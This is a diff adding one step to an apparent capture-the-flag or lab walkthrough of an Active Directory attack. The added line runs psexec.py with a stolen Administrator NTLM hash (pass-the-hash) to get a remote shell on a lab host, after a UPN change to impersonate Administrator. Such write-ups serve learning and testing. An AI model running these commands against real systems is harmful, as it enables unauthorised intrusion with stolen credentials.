@@ -259,4 +259,8 @@ To exploit this, we will change the UPN of the user `p.agila` to Administrator, 
 
 <img width="918" height="207" alt="image" src="https://github.com/user-attachments/assets/7e92434a-e252-436d-800b-811987665242" />
 
-18. 
+18. Using the NTLM hash, log into the machine as Administrator using `psexec.py`
+
+`psexec.py Administrator@10.129.10.195 -hashes $(cat creds/administrator.ntlm_hash)`
+
+
